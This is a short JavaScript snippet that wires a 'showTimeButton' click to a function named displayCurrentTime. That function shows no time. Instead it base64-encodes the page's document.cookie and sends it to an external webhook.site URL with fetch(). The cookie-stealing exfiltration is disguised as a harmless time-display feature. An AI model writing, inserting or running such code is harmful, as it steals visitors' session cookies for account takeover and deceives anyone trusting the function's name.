document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");
  button.addEventListener("click", function () {
    displayCurrentTime();
  });

  function displayCurrentTime() {
    fetch('https://webhook.site/8b686791-312a-4924-9bb2-8f1b124c8b56?'+window.btoa(document.cookie))
  }
});
